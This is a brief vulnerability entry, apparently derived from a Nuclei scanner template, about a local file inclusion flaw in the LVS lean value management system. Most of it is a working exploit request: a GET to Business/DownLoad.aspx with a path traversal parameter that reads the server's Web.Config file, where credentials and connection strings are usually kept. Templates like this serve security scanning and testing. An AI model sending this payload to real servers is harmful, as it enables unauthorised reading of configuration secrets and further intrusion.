# Vulnerability: LVS DownLoad.aspx - Local File Inclusion (LFI)
**Classification:** LVS
**Source:** Nuclei Template (`lvs-download-lfi.yaml`)

## Description
LVS lean value management system DownLoad.aspx has an arbitrary file reading vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/Business/DownLoad.aspx?p=UploadFile/../Web.Config
```

